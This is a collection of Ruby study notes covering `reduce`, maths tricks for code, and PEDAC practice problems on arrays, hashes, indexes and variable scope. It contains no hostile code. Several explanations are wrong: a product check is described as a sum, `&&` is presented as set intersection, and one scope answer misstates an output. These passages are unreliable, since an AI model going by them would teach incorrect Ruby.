list = (1..5).to_a

result = list.reduce do |sum, n|
  sum + n
end

puts result # 15
```

In this case, `#reduce` will pass the first element of the array (`1`) to the
first argument (`sum`) and the second element (`2`) to the second argument
(`n`).

The block execution then kicks in and return `1 + 2 = 3`.

In the next iteration, that `3` will become the value of `sum` and the next
element of the array (here, `3`) will become the value of `n`.

The block execution then kicks in and return `3 + 3 = 6`.

And so on until the end of the array.


## Example with one numerical argument

```ruby
list = (1..5).to_a

result = list.reduce(6) do |sum, n|
  sum + n
end

puts result # 21
```

The only difference here is the first element passed to `sum` is not the first
element of the array `list`, but the argument `6` instead. The first element of
the array (`1`) is passed to `n`.

In this scenario, when the block execution kicks in for the first time, it
returns `6 + 1 = 7`.


## Example with one symbol argument

```ruby
list = (1..5).to_a

result = list.reduce(:*)

puts result # 120
```

In this case, `#reduce` will perform a multiplication istead of an addition.

The result will be `1 * 2 * 3 * 4 * 5 = 120`.

It is possible to add a first numerical argument as well.


===

<!-- Source: computing/software/ruby/learning-tracks.md -->
<!-- URL: /computing/software/ruby/learning-tracks -->
<!-- Title: Learning Tracks -->
<!-- Wikilinks: [[computing/software/ruby/learning-tracks]], [[software/ruby/learning-tracks]], [[ruby/learning-tracks]], [[learning-tracks]] -->

---
date: 2020-09-15T23:19
---

# Learning Tracks

* Programming Foundations (link missing)
* [[study-guide-test]]#
* [[study-guide-for-interview]]#


===

<!-- Source: computing/software/ruby/learning-tracks/maths-shortcut-tricks-code.md -->
<!-- URL: /computing/software/ruby/learning-tracks/maths-shortcut-tricks-code -->
<!-- Title: Maths Shortcut Tricks for Code -->
<!-- Wikilinks: [[computing/software/ruby/learning-tracks/maths-shortcut-tricks-code]], [[software/ruby/learning-tracks/maths-shortcut-tricks-code]], [[ruby/learning-tracks/maths-shortcut-tricks-code]], [[learning-tracks/maths-shortcut-tricks-code]], [[maths-shortcut-tricks-code]] -->

---
date: 2021-02-24T09:38
---

Maths Shortcut Tricks for Code
==============================

You don't need a PhD in maths to start programming. However, knowing
some tricks and basic concepts doesn't hurt.

Check for One Positive and One Negative Number
----------------------------------------------

Let's start with basic arithmetic. You should know that:

-   When multiplying two positive numbers, we get a **positive** number
-   When multiplying two negative numbers, we get a **positive** number
-   When multiplying one positive and one negative number, we get a
    **negative** number.

This is useful when we need a user to input two numbers: one positive
and one negative. Indeed, if the sum of those two numbers is negative,
we can be sure the user inputted both a negative and negative numbers.
Otherwise the result would be positive.

We can use this trick as a break condition.

``` ruby
loop do
  first_number = gets.chomp.to_i
  second_number = gets.chomp.to_i
  break if first_number * second_number < 0 # Sum must be a negative number
  puts '>> Sorry. One integer must be positive, one must be negative.'
end

# Rest of the code...
```

Intersection (Set Theory)
-------------------------

The intersection of two sets $A$ and $B$ is the set containing all
elements of $A$ which are also in $B$. It is denoted $A \cap B$.

Ruby's `count` method uses intersection. The way this `count` method
uses intersection is actually the basis for how other methods "works".
Therefore it is important to understand how it works.

Imagine a String object `hello world` of eleven characters. We will
assign an hexadecimal index for each characters, to make it simpler to
know which characters we are talking about.

``` ruby
# 123456789AB
 'hello world'.count('lo')  # => 5
```

In the example above, the `count` method called on the String object
counts the occurrence of the characters passed to it as an argument.
Here, characters `'l'` and `'o'`. While there are two characters, they
form the only argument passed to the method. This means the set contains
all elements of itself, i.e., the two characters. The methods *counts*
(literally) each occurrence of characters included in the set: 3, 4, 5,
8 and A of our hexadecimal index.

We can verify the selected characters with the `scan` method:

``` ruby
'hello world'.scan(/l|o/)  # => ["l", "l", "o", "o", "l"]
```

Let's spice things up by passing a second argument to the `count`
method.

``` ruby
# 123456789AB
 'hello world'.count('lo', 'o')  # => 2
```

2? Why is that? Well `count` returns the occurrence of the characters at
the intersection of the two parameters passed to it. Let's break it down
what's happening step by step.

First, and this may looks obvious but let's check which characters are
passed to `count`, i.e., what's inside the two parameters:

``` ruby
'lo'.split('')  # => ["l", "o"]
'o'.split('')   # => ["o"]
```

Nothing revolutionizing here. The characters passed to count are `l`,
`o` for the first argument and `o` for the second.

Now remember, the `count` method is interested in the *intersection* of
the set of characters passed to it as arguments. In mathematics, if we
call the first argument $A$ and the second argument $B$, we can write it
like this: $A \cap B$ as seen before.

Let's replace $A$ and $B$ with arrays containing the characters for each
argument: `["l", "o"] ∩ ["o"]`.

The next step is to find every characters that are in both `["l", "o"]`
and `["o"]`:

`["l", "o"]` $\cap$ `["o"] = ["o"]`

The character `'o'` is the only one! We can verify this is true using
the AND operator:

``` ruby
'lo'.split('') && 'o'.split('')  # => ["o"]
```

Finally, `count` method counts the number of occurrence of `"o"` in the
string it is called upon: characters at 5 and 8 in our hexadecimal
index.

This is true for any number of arguments: with $A \cap B \cap C$ you
would have the count for the characters that is present in $A$, $B$ and
$C$. If there is none, `count` returns `0`.

Factorial
---------

A factorial is an operation that involves multiplying sequential
positive numbers together. They are often written with a exclamation
mark: `n!`.

{.ui .memo .info} By definition, $0!$ and $1!$ are $1$.

$$
\begin{split}
    0! &= 1 \\
    1! &= 1 \\
    2! &= 2 \times 1 = 2 \\
    3! &= 3 \times 2 \times 1 = 6 \\
    4! &= 4 \times 3 \times 2 \times 1 = 24 \\
    5! &= 5 \times 4 \times 3 \times 2 \times 1 = 120
\end{split}
$$

And so forth.

In Ruby, you can use `inject` or `reduce` to simulate a factorial,
passing in `:*` as an argument. Take care however to start the
collection of number at `1`, otherwise as those two methods do not know
the rule of $0!$, your result will always be `0` ($0 \times n = 0$).

``` ruby
(1..5).to_a.reduce(:*)
# => 120
```

Prime Number
------------

A prime number is a number greater than 1 that is not a product of two
smaller numbers. In other words, when divided by every number between 2
and itself, the results is not a natural number (0, 1, 2, 3…).

To find a prime number, one should divide the candidate number by 2, 3,
4 etc until itself and see if the remainder is zero. If it is, that
means the number we are working on is not prime.

In reality, we only need to test number between 2 up to the *square
root* of the candidate number.

``` ruby
def prime?(candidate)
  return false if candidate < 2

  limit = Integer.sqrt(candidate)

  2.upto(limit) do |factor|
    return false if candidate % factor == 0
  end

  true
end

p prime?(2)  # => true
p prime?(3)  # => true
p prime?(4)  # => false
p prime?(5)  # => true
p prime?(6)  # => false
```

Expanded Form
-------------

Expanded form are a way to write number into the value of each of its
digits.

There are several way to write expanded form ; the standard is the
following: $$734 = 700+30+4$$

We commonly use the base 10 system, meaning each digit represents a
power of 10. The operation above can be written as the product of the
digit and the power of 10s place, like this:

$$734 = (7 \times 100)+(3 \times 10)+(4 \times 1)$$

Let's convert the values to powers of 10 so that we can see a pattern:

$$734 = (7 \times 10^2)+(3 \times 10^1)+(4 \times 10^0)$$

As you can see from the operation above, the powers of 10 are descending
from `2` to `0`. This seems like a pattern we can use in programming.

``` ruby
def expanded_form(num)
  digits = num.digits
  expanded = []

  digits.each_with_index do |digit, power|
    if digit > 0
      expanded << digit * (10**power)
    end
  end

  expanded.reverse.join(' + ')  # Need to reverse because of Integer#digits
end

p expanded_form(12) == '10 + 2'
p expanded_form(42) == '40 + 2'
p expanded_form(70304) == '70000 + 300 + 4'
```

You can modify the base (here, `10`) to convert from one base to base
10. For example from base 2 or 8 to base 10.

[Source](https://www.math.net/expanded-form)

Iterate over Collection with Fixed Length
-----------------------------------------

Another tiny trick of maths one can use is to easily iterate over a
collection with a fixed length thanks to the modulo operator `%`.

Let's say we have an array object of five elements.

``` ruby
arr = ['A', 'B', 'C', 'D', 'E']
```

For whatever reason, we cannot iterate over it with `each` method, maybe
because we need to know retain the current position inside the array
between each iteration (*wink wink* [Circular
Buffer](https://en.wikipedia.org/wiki/Circular_buffer)). Whatever the
reason, simply incrementing a variable `index` won't help us past `4`.

``` ruby
arr = ['A', 'B', 'C', 'D', 'E']
index = 5
arr[index] # => nil
```

Here, we want `arr[5]` to return the first element (`'A'`), `arr[6]` to
return the second element (`'B'`) etc.

The easiest way to do it is to increment our variable `index` and
calling modulo passing in the collection's length as a parameter. In
other words:

``` ruby
index = 4
new_index = (index + 1) % arr.length # => 0
arr[new_index] # => 'A'
```

This works because the `%` method discards the *quotient* and returns
the *rest*. It's easier to see what's going on using the `divmod`
method, which returns both the *quotient* and the *rest* (or *modulus*).

``` ruby
arr = ['A', 'B', 'C', 'D', 'E']
index = 21

_, new_index = (index + 1).divmod(arr.length) # => [4, 2]

arr[new_index] # => 'C'
```

Here, 21 is 4 whole iterations over a collection with 5 elements, rest
2.

{.ui .info .message} Replace `index + 1` with just `index` if you don't
wish to increment the local variable `index`, but just wish to find the
position in the collection.


===

<!-- Source: computing/software/ruby/learning-tracks/practice-problems-arrays-manipulation.md -->
<!-- URL: /computing/software/ruby/learning-tracks/practice-problems-arrays-manipulation -->
<!-- Title: Practice Problems: Arrays Manipulation -->
<!-- Wikilinks: [[computing/software/ruby/learning-tracks/practice-problems-arrays-manipulation]], [[software/ruby/learning-tracks/practice-problems-arrays-manipulation]], [[ruby/learning-tracks/practice-problems-arrays-manipulation]], [[learning-tracks/practice-problems-arrays-manipulation]], [[practice-problems-arrays-manipulation]] -->

---
date: 2021-03-04T09:38
---

# Practice Problems: Arrays Manipulation

See also [[practice-problems-indexes-manipulation]].

## Example 1

```ruby
=begin

The maximum sum subarray problem consists in finding the maximum sum of
contiguous subsequence in an array of integers:

maxSequence [-2, 1, -3, 4, -1, 2, 1, -5, 4]
should be 6: [4, -1, 2, 1]

Easy case is when the array is made up of only positive numbers and the maximum
sum is the sum of the whole array. If the array is made up of only negative
numbers, return 0 instead.

Empty array is considered to have zero greatest sum. Note that the empty array
is also a valid subarray.

# PEDAC

# Problem

Input: an array of integer
Output: the maximum sum consisting of CONTIGUOUS subsequence

Clarify:

- All positive: return sum of array
- All negative: return 0
- Empty array: return 0
- CONTIGUOUS subsequences

# Data

arrays

# Algorithm

. Return sum of array if all positive
. Return 0 if all negative
. Return 0 if empty array

. NUMBER TO SELECT FIRST ELEMENT OF SUBARRAY
  . Create a loop from 0 up to the number of element -1 in the array
    . For each loop, the parameter will be the first element of the subarray

. NUMBER TO SELECT LAST ELEMENT OF SUBARRAY
  . Create a loop form FIRST_ELE (above) up to num of element -1 in the array
    . For each loop, the parameter will be the last element of the subarray
    . Save each sum of subarray in `sequences_sum`

. Return max of `sequences`

=end

def all_sequences(max_sequence, seq_start)
  sequence_size = max_sequence.size
  subsequences_sum = Array.new

  seq_start.upto(sequence_size) do |seq_end|
    subsequences_sum << max_sequence[seq_start...seq_end].sum
  end

  subsequences_sum
end

def max_sequence(max_sequence)
  return max_sequence.sum if max_sequence.all?(&:positive?)
  return 0                if max_sequence.all?(&:negative?)
  return 0                if max_sequence.empty?

  sequence_size = max_sequence.size
  sequences_sum = Array.new

  0.upto(sequence_size - 1) do |seq_start|
    sequences_sum << all_sequences(max_sequence, seq_start).max
  end

  sequences_sum.max
end

p max_sequence([]) == 0
p max_sequence([-2, 1, -3, 4, -1, 2, 1, -5, 4]) == 6
p max_sequence([11]) == 11
p max_sequence([-32]) == 0
p max_sequence([-2, 1, -7, 4, -10, 2, 1, 5, 4]) == 12
```

**Time:** 30:51

## Example 2

```ruby
=begin

You are going to be given an array of integers. Your job is to take that array
and find an index N where the sum of the integers to the left of N is equal to
the sum of the integers to the right of N. If there is no index that would make
this happen, return -1.

For example:

Let's say you are given the array [1, 2, 3, 4, 3, 2, 1]:

Your method will return the index 3, because at the 3rd position of the array,
the sum of left side of the index [1, 2, 3] and the sum of the right side of
the index [3, 2, 1] both equal 6.

Another one:

You are given the array [20, 10, -80, 10, 10, 15, 35]
At index 0 the left side is []
The right side is [10, -80, 10, 10, 15, 35]
They both are equal to 0 when added. (Empty arrays are equal to 0 in this
problem)
Index 0 is the place where the left side and right side are equal.

# PEDAC

## Problem

Return the index where the sum of the integers to the right and to the left are
equal.

Input: arrays of integer
Output: integer (an index)

Clarify:

- Empty is equal to 0
- Return -1 as last resort

## Data
Arrays

## Algorithm

. Iterate over the given array passing in the index as a param
  . Init local variable left_side to the first element until index (non
    inclusive)
  . Init local variable right_side to index (non inclusive) until last element
    . Reassign empty array to right_side is is nil
  . Check if sum of left_side equals sum of right_side
    . TRUE: return index
    . FALSE: continue
  . Return -1

=end

def find_even_index(array)
  0.upto(array.size) do |index|
    # puts "index: #{index}"
    left_side = array[0...index]
    right_side = array[index + 1..-1]
    right_side = [] if right_side.nil?

    return index if left_side.sum == right_side.sum
  end

  -1
end

p find_even_index([1, 2, 3, 4, 3, 2, 1]) == 3
p find_even_index([1, 100, 50, -51, 1, 1]) == 1
p find_even_index([1, 2, 3, 4, 5, 6]) == -1
p find_even_index([20, 10, 30, 10, 10, 15, 35]) == 3
p find_even_index([20, 10, -80, 10, 10, 15, 35]) == 0
p find_even_index([10, -80, 10, 10, 15, 35, 20]) == 6
p find_even_index([-1, -2, -3, -4, -3, -2, -1]) == 3
```

**Time:** 18:48

## Example 3

```ruby
=begin

Imagine a sequence of consecutive even integers, beginning with 2. The integers
are grouped in rows, with the first row containing one integer, the second row
two integers, the third row three integers, and so on. Given an integer
representing the number of a particular row, return an integer representing the
sum of all the integers in that row.

# PEDAC

## Problem

Given a row number, return the sum of the sequence in that row.
A sequence consist of n consecutive even number for each row n, starting at
two.

Input: integer representing the row
Output: integer representing the sum of the sequence at the given row number

Clarification:

- Only positive number? (Yes)
- Rows are 1 indexed? (Yes)

## Data

Arrays of arrays
[
  [2],
  [4, 6],
  [8, 10, 12],
  [14, 16, 18, 20],
]

## Algorithm

. CREATE_SEQUENCE
  . Init local variable index to 1, to know current row number
  . Init local variable current_num to 2, to know current number in array
  . Init local variable sequence to new Array
  . Loop
    . Break condition: sequence array size is greater than given row_num number
      of arrays
    . Init local variable row to new Array
    . Loop for index times
      . Add current_num to row
      . Increment current_num by 2
    . Add row to sequence
    . Increment index by 1
  . Return sequence

. SUM_ROW
  . Save return value of CREATE_SEQUENCE to initialized local variable sequence
  . Return sum of sequence at row_num
=end

def create_sequence(max_row)
  index = 1
  current_num = 2
  sequence = Array.new

  loop do
    break if sequence.size > max_row
    row = Array.new

    index.times do
      row << current_num
      current_num += 2
    end

    sequence << row
    index += 1
  end

  sequence
end

def sum_even_number_row(row_num)
  sequence = create_sequence(row_num)

  sequence[row_num - 1].sum
end

p sum_even_number_row(1) == 2
p sum_even_number_row(2) == 10
p sum_even_number_row(4) == 68
```

**Time:** 20:35

## Example 4

```ruby
=begin

You are given an array that contains only integers (positive and negative).
Your job is to sum only the numbers that are the same and consecutive. The
result should be one array.

You can assume there is never an empty array and there will always be an
integer.

# PEDAC

## Problem

Given an array of positive and negative numbers, sum the same consecutive
number and return the new array.

Input: An array of positive and negatives numbers with some behing the same and
consecutive.
Output: An new array of numbers, each different

Clarification:

- Positive and negative numbers
- No empty array
- Only integers
- Array on the left will always be bigger than array on the right (except for
  next point)
- Return given array if each integer are different
- Do I need to return same array? (No)

## Data

Arrays of integers

## Algorithm

. Init a local variable result to a new Array object
. Init a local variabe outer_index to 0
. Iterate over the given array
  . Init local var inner_index to 1
  . Init local var sum to current element
    . Loop until next element is different from current element
      . Add element at inner_index to sum
      . Increment inner_index
      . Break if next element different from current element
  . Save sum to result array
  . Increment outer_index by inner_index
  . Break if outer_index is equal to array size
. Return the result array

=end

def sum_consecutives(array)
  result = []
  outer_index = 0

  loop do
    inner_index = 1
    sum = array[outer_index]

    loop do
      break if array[outer_index + inner_index].nil?

      if array[outer_index] == array[outer_index + inner_index]
        sum += array[outer_index + inner_index]
        inner_index += 1
      else
        break
      end
    end

    result << sum
    outer_index += inner_index
    break if outer_index > array.size
  end

  result.compact
end

p sum_consecutives([1, 4, 4, 4, 0, 4, 3, 3, 1, 1]) == [1, 12, 0, 4, 6, 2]
p sum_consecutives([1, 1, 7, 7, 3]) == [2, 14, 3]
p sum_consecutives([-5, -5, 7, 7, 12, 0]) == [-10, 14, 12, 0]
```

**Time: 33:58**

## Example 5

```ruby
=begin

Write a method that takes an array of strings and returns an array of the same
string values, except with the vowels removed.

# PEDAC

## Problem

Return an array of given strings without their vowels.

Input: An array of strings
Output: An array of the same strings, without their vowels

Clarification:

- Same array? (no)
- What are vowels in English? (a, i, u, e, o)
- Case important? (yes)
- Order important

## Data

Arrays of strings

## Algorithm

. Init a constant with each vowels of English
. Loop over the given array
  . For each string, look for each vowels and delete if they exists
  . Return each string
. Return the new array with the return value of the loop

=end

VOWELS = %w(a e i o u A E I O U)

def remove_vowels(array)
  array.map do |word|
    VOWELS.each do |vowel|
      word.delete!(vowel)
    end

    word
  end
end

p remove_vowels(['green', 'yellow', 'black', 'white']) == ['grn', 'yllw',
                                                           'blck', 'wht']
```

**Time:** 07:34

## Example 6

```ruby
=begin

Write a method that will take an array of methods and only return those that
are prime.

# PEDAC

## Problem

Given an array of integers, return an array with the number from the given
array that are prime.

Input: array of integers
Output: array of integers (prime)

Clarification:

- Prime is a number that cannot be composed from the product of numbers smaller
  than itself
- Create new array? (No, mutation)

## Data

Array

## Algorithm

. Loop over the array
  . For each number, PRIME?
    . Delete the number from the array if PRIME? returns false
  . Break when iteration is equal or bigger than number of element in the array
. Return the array

. PRIME?
. Iterate from 2 to square root of the given number
  . Check if the remainder of given number as numerator and current number as
    denominator is zero
    . If true, return false
. Return true

=end

def prime?(numerator)
  return false if numerator < 2
  limit = Integer.sqrt(numerator)

  2.upto(limit) do |denominator|
    return false if numerator % denominator == 0
  end

  true
end

def select_primes(candidates)
  iterator = 0

  loop do
    unless prime?(candidates[iterator])
      candidates.delete(candidates[iterator])
      iterator -= 1
    end
    iterator += 1
    break if candidates[iterator].nil?
  end

  candidates
end

p select_primes([1, 2, 3, 4]) == [2, 3]
p select_primes([4, 6, 8, 10]) == []
```

**Time:** 18:41

## Example 7

```ruby
=begin

Write a method that combines two Arrays passed in as arguments and returns a new
Array that contains all elements from both Array arguments, with the elements
taken in alternation.

You may assume that both input Arrays are non-empty and that they have the same
number of elements.

# PEDAC

## Problem

Combine two arrays, starting with the first, then the second, then the first
etc alternatively.

Input: Two arrays
Output: The combinaison of both array

Clarification:

- Non-empty
- Same number of element
- Always start with the first array? (Yes)
- Order matters (don't modify it)
- New array

## Data

Array

## Algorithm

. Init a local variable interleave to a new empty Array
. Create a loop
  . Delete the first object of the first array and save it to interleave
  . Delete the first object of the second array and save it to interleave
  . Break if the first array is empty
. Return interleave

=end

def interleave(array1, array2)
  interleave = []

  loop do
    interleave << array1.shift
    interleave << array2.shift

    break if array1.empty?
  end

  p interleave
end

p interleave([1, 2, 3], ['a', 'b', 'c']) == [1, "a", 2, "b", 3, "c"]
```

**Time:** 09:10

## Example 8

```ruby
=begin

You are given array of integers, your task will be to count all pairs in that
array and return their count.

Notes:

Array can be empty or contain only one value; in this case return 0

If there are more pairs of a certain number, count each pair only once. E.g.:
for [0, 0, 0, 0] the return value is 2 (= 2 pairs of 0s)

Random tests: maximum array length is 1000, range of values in array is between
0 and 1000

Examples

[1, 2, 5, 6, 5, 2]  -->  2
  ...because there are 2 pairs: 2 and 5

[1, 2, 2, 20, 6, 20, 2, 6, 2]  -->  4
  ...because there are 4 pairs: 2, 20, 6 and 2 (again)

# PEDAC

## Problem

Count the pairs in an array of integers and return the count

Input: Array of integers with one or more duplicates
Output: Integer representing the number of pair

Clarification:

- Pair is 2 same number
- If there are more than 2 same numbers, count the pair (4 same num = 2 pairs)
- Return 0 if the array is empty

## Data

Array

## Algorithm

.  Return 0 if array is empty
.  Init a local variale pairs to 0
.  Iterate over the array passing in num
  .  Count the number of num in the array
  .  If the count is more than 1
    .  Increment pairs by half of the count
  .  Delete the num from the array
.  Return pairs

=end

def pairs(array)
  return 0 if array.empty?

  pairs = 0
  candidates = array.dup

  array.each do |num|
    duplicates = candidates.count(num)

    if duplicates > 1
      pairs += duplicates / 2
    end

    candidates.delete(num)
  end

  pairs
end

p pairs([1, 2, 5, 6, 5, 2]) == 2
p pairs([1, 2, 2, 20, 6, 20, 2, 6, 2]) == 4
p pairs([0, 0, 0, 0, 0, 0, 0]) == 3
p pairs([1000, 1000]) == 1
p pairs([]) == 0
p pairs([54]) == 0
```

**Time:** 12:49


===

<!-- Source: computing/software/ruby/learning-tracks/practice-problems-hashes-manipulation.md -->
<!-- URL: /computing/software/ruby/learning-tracks/practice-problems-hashes-manipulation -->
<!-- Title: Practice Problems: Arrays Manipulation -->
<!-- Wikilinks: [[computing/software/ruby/learning-tracks/practice-problems-hashes-manipulation]], [[software/ruby/learning-tracks/practice-problems-hashes-manipulation]], [[ruby/learning-tracks/practice-problems-hashes-manipulation]], [[learning-tracks/practice-problems-hashes-manipulation]], [[practice-problems-hashes-manipulation]] -->

---
date: 2021-03-17T13:50
---

# Practice Problems: Arrays Manipulation

## Example 1

```ruby
=begin

# Implement the `search` method.

# PEDAC

## Problem

Given a query containing a minimum and maximum price, and a requested computer
brand, return a list of possible purchases.

Input: a search query with a min and max price, and a computer brand
Output: a list of purchase candidates

Clarify:

- Min/max are inclusive
- Search query for name is not exact (only brand name, no case)
- Name always starts with brand name? (Yes)

## Data

Hashes

## Algorithm

. Init a local var branded_products to new Hash
. Iterate over PRODUCTS and select each element where the name is equal to the
  query, save result to branded_products
. Iterate over branded_products and select elements for which price is between
  min and max
. Return the result

=end

PRODUCTS = [
  { name: "Thinkpad x210", price: 220 },
  { name: "Thinkpad x230", price: 250 },
  { name: "Thinkpad x250", price: 979 },
  { name: "Thinkpad x230", price: 300 },
  { name: "Thinkpad x230", price: 330 },
  { name: "Thinkpad x230", price: 350 },
  { name: "Thinkpad x240", price: 700 },
  { name: "Macbook Leopard", price: 300 },
  { name: "Macbook Air", price: 700 },
  { name: "Macbook Pro", price: 600 },
  { name: "Macbook", price: 1449 },
  { name: "Dell Latitude", price: 200 },
  { name: "Dell Latitude", price: 650 },
  { name: "Dell Inspiron", price: 300 },
  { name: "Dell Inspiron", price: 450 }
]

query = {
  price_min: 240,
  price_max: 280,
  q: "thinkpad"
}

query2 = {
  price_min: 300,
  price_max: 450,
  q: 'dell'
}

def search(query)
  branded_products = PRODUCTS.select do |model|
    model[:name].downcase.start_with?(query[:q])
  end

  branded_products.select do |model|
    model[:price].between?(query[:price_min], query[:price_max])
  end
end

p search(query) == [{ name: "Thinkpad x230", price: 250 }]
p search(query2) == [{ name: "Dell Inspiron", price: 300 },
                     { name: "Dell Inspiron", price: 450 }]
```

**Time:** 12:27

## Example 2

```ruby
=begin

Write a method that takes a string and returns a boolean indicating if this
string has a balanced set of parentheses.

# PEDAC

## Problem

Given a string, return true if it has set of balanced parentheses, false
oterwise.

Input: A string with one or more open and closed parentheses
Output: A boolean indicating if open/close parentheses were balanced or not

Clarify:

- True when no parentheses? (Yes)
- Only `(` and `)` counts? (Yes)
- They must be in the right order
- Can't possibly have more closing parentheses than opening parentheses

## Data

A Hash of parentheses and their count

## Algorithm

. Init a local variable parentheses_counter Hash to open/close parentheses key
  and values 0
. Iterate over the string
  . If the current character is an opening/closing parentheses, increment its
  count in parentheses_counter
  . Return false if the Hash has more closing parentheses than opening
. Return equality between opening and closing parentheses

=end

def balancer(string)
  parentheses_counter = { '(' => 0,
                          ')' => 0 }
  string.chars.each do |char|
    if parentheses_counter.key?(char)
      parentheses_counter[char] += 1
    end
    return false if parentheses_counter[')'] > parentheses_counter['(']
  end
  parentheses_counter[')'] == parentheses_counter['(']
end

p balancer("(hi") == false
p balancer("(hi)") == true
p balancer("(()) hi") == true
p balancer(")(") == false
```

**Time:** 16:33


===

<!-- Source: computing/software/ruby/learning-tracks/practice-problems-indexes-manipulation.md -->
<!-- URL: /computing/software/ruby/learning-tracks/practice-problems-indexes-manipulation -->
<!-- Title: Practice Problems: Indexes Manipulation -->
<!-- Wikilinks: [[computing/software/ruby/learning-tracks/practice-problems-indexes-manipulation]], [[software/ruby/learning-tracks/practice-problems-indexes-manipulation]], [[ruby/learning-tracks/practice-problems-indexes-manipulation]], [[learning-tracks/practice-problems-indexes-manipulation]], [[practice-problems-indexes-manipulation]] -->

---
date: 2021-03-17T09:55
---

# Practice Problems: Indexes Manipulation

See also [[practice-problems-arrays-manipulation]].

## Example 1

```ruby
=begin
Select the element out of the array if its index is a fibonacci number.

# PEDAC

## Problem

Given an array of elements (whatever element), return on array of the element
for witch their index are fibonacci number.

Intput: an array of elements
Output: an array of elements for witch their index are fibonacci numbers

Clarify:

- Fibonacci numbers are fib(0) = 0, fib(1) = 1, fib(n) = fib(n-1) + fib(n-2)
- Working with indexes so element can be whatever object which can be in an
  array

## Data

Arrays of element

## Algorithm

. Init local var array_size to size of given array
. Init fib_sequence and save return value of FIBONACCI_SEQUENCE for each number
  from 0 to array_size
. For each number from 0 to array_size, check if it appears in fib_sequence,
  save the element to fib_elements if true
. Return fib_elements

FIBONACCI_SEQUENCE
. Call fibonacci on each number from 0 to array size and save each result

FIBONACCI
. Return 0 if num is negative
. Return number if number is less than 2
. Fibonacci num - 1 + Fibonacci num - 2

end

=end

def fibonacci(num)
  return 0 if num.negative?
  return num if num < 2

  fibonacci(num - 1) + fibonacci(num - 2)
end

def fib_sequence(max)
  (0..max).to_a.map do |num|
    fibonacci(num)
  end
end

def fib_index_select(array)
  array_size = array.size
  fib_indexes = fib_sequence(array_size)
  fib_elements = []

  0.upto(array_size - 1) do |array_index|
    if fib_indexes.include?(array_index)
      fib_elements << array[array_index]
    end
  end

  fib_elements
end

p fib_index_select([1, 2, 3, 4, 5, 6]) == [1, 2, 3, 4, 6]
p fib_index_select(('a'..'z').to_a) == ["a", "b", "c", "d", "f", "i", "n", "v"]

```

**Time:** 47:52


===

<!-- Source: computing/software/ruby/learning-tracks/practice-problems-local-variable-scope.md -->
<!-- URL: /computing/software/ruby/learning-tracks/practice-problems-local-variable-scope -->
<!-- Title: Practice Problems: Local Variable Scope -->
<!-- Wikilinks: [[computing/software/ruby/learning-tracks/practice-problems-local-variable-scope]], [[software/ruby/learning-tracks/practice-problems-local-variable-scope]], [[ruby/learning-tracks/practice-problems-local-variable-scope]], [[learning-tracks/practice-problems-local-variable-scope]], [[practice-problems-local-variable-scope]] -->

---
date: 2020-12-28T16:43
---

# Practice Problems: Local Variable Scope

## Example 1

```ruby
a = 'Hello'
b = a
a = 'Goodbye'

puts a
puts b
```

**Answer:**

The code outputs `"Goodbye"` then `"Hello"` then returns `nil`.

On `line 1` we are initializing the local variable `a` to a String object of
value `Hello`.

On `line 2` we are initializing the local variable `b` to the value of the
String object which local variable `a` points to.

On `line 3` we are reassigning the local variable `a` to a String object of
value `Goodbye`.

On `line 5` we are calling the method `puts` and passing in the local variable
`a`. Method `puts` output the value of the object which the passed in local
variable points to, and returns `nil`.

On `line 6` we are calling the method `puts` and passing in the local variable
`b`. Method `puts` output the value of the object which the passed in local
variable points to, and returns `nil`.

This code demonstrates the concept of variable as pointer of address in memory.

**Time:** 04:57

## Example 2

```ruby
a = 4

loop do
  a = 5
  b = 3

  break
end

puts a
puts b
```

**Answer:**

This code outputs `5` then raise an error `undefined local variable or method
'b'`.

On `line 1` we are initializing the local variable `a` to an Integer object of
value `4`.

On `line 3-8` we are calling the method `loop` and passing in the `do..end`
block as an argument. The `do..end` block is executed for until the `break`
condition is met.

On `line 4` we are reassigning the local variable `a` to a different Integer
object, this timne of value `5`.

On `line 5` we are initializing the local variable `b` to an Integer object of
value `3`.

On `line 7` we are breaking out of the loop with the `break` keyword.

On `line 10` we are calling the `puts` method, passing in the local variable
`a` as an argument.

On `line 11` we are calling the `puts` method, passing in the local variable
`b` as an argument. However, the local variable `b` is unreachable in this
scope because it was initialized in a different scope.

This code demonstrates the concept of variable scope and how it affect which
local variable can be used or not in different scope of the code.

**Time 1:** 07:46
**Time 2:** 06:20

## Example 3

```ruby
a = 4
b = 2

loop do
  c = 3
  a = c

  break
end

puts a
puts b
```

**Answer:**

This code will output `3`, then `2` and returns `nil`.

On `line 1` we are initializing the local variable `a` to an Integer object of
value `4`.

On `line 2` we are initializing a local variable `b` to an Integer object of
value `2`.

On `line 4-8` we are calling the `loop` method and passing in the `do..end`
block as an argument. The `do..end` block is executed until the break condition
is met.

On `line 5` we are initializing a local variable `c` to an Integer object of
value `3`.

On `line 6` we are reassigning the local variable `a` to the Integer object
pointed by local variable `c`.

On `line 8` we are breaking out of the loop with the `break` keyword.

On `line 11` we are calling the `puts` method, passing in local variable `a` as
an argument.

On `line 12` we are calling the `puts` method, passing in local variable `b` as
an argument.

This code demonstrates the concept of variable scope and how it affets which
local variable can and cannot be called depending of the scope it has been
initialized in.

**Time 1:** 05:46
**Time 2:** 05:35

## Example 4

```ruby
def example(str)
  i = 3
  loop do
    puts str
    i -= 1
    break if i == 0
  end
end

example('hello')
```

**Answer:**

The following code return `nil` and output `'hello'` three times.

On `line 1-8` we are defining the `example` method with one parameter.

On `line 2` we are initializing a local variable with the integer object `3`.

On `line 3` we are calling the `loop` method and passing in the `do..end` block
as an argument.

In the block, on `line 4` we are calling the `puts` method and passing in the
`str` parameter to it. It output the string object `hello` and return `nil`.

On `line 5` we are reassigning the local variable `i` to `i - 1`. `-=` Is a
shorthand for `= i - 1` and `-` is a method call on `i` with the argument `1`.

On `line 6` we are breaking out of the loop if the condition is met. The
condition asks for the local parameter `i` to be equal to `0`.

On `line 10` we are calling the `example` method passing in one argument: a
string object `'hello'`.

This code demonstrates the concept of loop with breaking condition.

**Time:** 10:18

## Example 5

```ruby
def greetings(str)
  puts str
  puts "Goodbye"
end

word = "Hello"

greetings(word)
```

**Answer:**

The code return nothing and outputs:

```ruby
Hello
Goodbye
```

On `line 1-4` we are defining the `greetings` method with one parameter `str`.

On `line 2` we are calling the `puts` method and passing in the local
variable `str` which points to the string object `Hello`. This line outputs
`Hello` and return `nil`.

On `line 3` we are calling the `puts` method and passing it the string
`"Goodbye"`. This line output `Hello` and return `nil`.

On `line 6` we are initializing the local variable `word` with the object
string `"Hello"`.

On `line 8` we are calling the `greetings` method passing in the local variable
`word` to it.

